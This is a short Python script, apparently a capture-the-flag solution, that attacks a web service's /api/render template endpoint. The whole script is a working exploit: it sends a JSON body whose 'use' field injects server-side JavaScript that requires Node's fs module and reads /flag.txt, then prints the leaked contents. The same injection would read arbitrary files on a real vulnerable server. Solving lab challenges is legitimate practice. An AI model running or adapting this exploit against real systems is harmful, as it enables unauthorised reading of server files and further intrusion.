import sys

import requests


def main():
    if len(sys.argv) != 2:
        print(f"usage: python3 {sys.argv[0]} <base_url>")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    body = {
        "template": "<%= x %>",
        "data": {},
        "use": ['x=process.mainModule.require("fs").readFileSync("/flag.txt","utf8")'],
    }

    response = requests.post(f"{base_url}/api/render", json=body, timeout=15)
    response.raise_for_status()
    print(response.json()["html"], end="")


if __name__ == "__main__":
    main()
